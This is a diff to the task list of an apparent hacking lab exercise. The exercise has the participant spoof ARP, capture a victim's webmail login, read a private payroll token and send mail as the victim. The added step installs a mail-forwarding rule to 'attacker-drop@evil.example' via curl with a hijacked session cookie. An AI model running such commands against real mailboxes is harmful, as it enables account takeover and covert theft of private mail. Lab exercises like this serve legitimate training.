@@ -20,7 +20,12 @@ Tasks:
 3. Log in to the webmail portal as victim.
 4. Open the victim private mail (payroll token) and read it.
 5. Send one mail AS victim (to anyone) as proof of full control.
-6. Run: checkwork
+6. Persist the control: install a forwarding rule on the victim
+   mailbox to an address you control, then verify it is stored:
+     curl -b /tmp/m.jar -d "target=attacker-drop@evil.example" http://victim-mail:8000/forward
+     curl -b /tmp/m.jar http://victim-mail:8000/settings/forwarding
+   (use your own login cookie jar file from step 3).
+7. Run: checkwork
 
 Tools available: arpspoof, tcpdump (use with sudo), telnet, curl,
 grep, iproute2, python3.
